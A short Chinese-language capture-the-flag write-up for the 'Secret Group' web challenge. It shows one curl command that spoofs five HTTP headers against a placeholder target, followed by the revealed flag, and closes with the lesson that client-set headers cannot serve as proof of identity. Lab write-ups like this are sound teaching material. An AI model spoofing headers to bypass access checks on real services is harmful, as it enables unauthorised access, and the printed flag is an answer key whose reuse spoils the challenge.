# Secret Group

## 题目简述

服务按固定顺序检查五个 HTTP 请求头，每次失败页面都会提示下一项期望值。构造一次满足全部条件的请求即可加入“秘密组”。

## 解题过程

使用 Burp Repeater 或 `curl` 设置源码要求的精确值：

```bash
curl 'http://TARGET/' \
  -H 'User-Agent: n00bz-4dm1n' \
  -H 'Accept: fl4g' \
  -H 'Connection: s3cur3' \
  -H 'Referer: s3cr3t.n00bz-4dm1n.xyz' \
  -H 'Give-Flag: 7ru3'
```

全部比较通过后返回：

```text
n00bz{y0u_4r3_n0w_4_v4l1d_m3mb3r_0f_th3_s3cr3t_gr0up!}
```

## 方法总结

HTTP 头由客户端控制，不能作为可靠身份凭据。顺序提示可以逐步恢复所有条件，但最终请求必须同时保留五个头和值。
